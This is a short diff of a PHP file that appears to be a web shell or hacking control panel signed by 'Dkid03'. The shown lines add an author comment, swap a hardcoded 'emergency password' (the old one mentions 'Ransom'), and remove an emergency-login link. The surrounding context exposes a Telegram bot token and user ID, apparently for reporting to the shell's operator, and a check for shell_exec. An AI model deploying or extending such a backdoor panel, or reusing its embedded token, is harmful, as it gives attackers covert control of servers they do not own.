@@ -1,4 +1,6 @@
 <?php
+//====Author: Dkid03===
+//pls don't change the author
 // ==================== LOGOUT HANDLER ====================
 if (isset($_GET['logout'])) {
     session_start();
@@ -17,7 +19,7 @@ $botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
 $telegramUserId = '7547598395';
 $verifCode = 'Dkid@123';
 
-define('EMERGENCY_PASSWORD', 'Dkid03Ransom!2025');
+define('EMERGENCY_PASSWORD', 'Dkid@123');
 define('ALLOWED_IP', '');
 
 if (!function_exists('shell_exec')) {
@@ -2671,7 +2673,6 @@ if (isset($_SESSION['loggedin'])) {
                 </form>
                 <?php endif; ?>
                 <div style="margin-top:12px;text-align:center;">
-                    <a href="?action=Dkid" style="color:var(--warning);">🚨 Login Darurat</a>
                 </div>
             </div>
         </div>
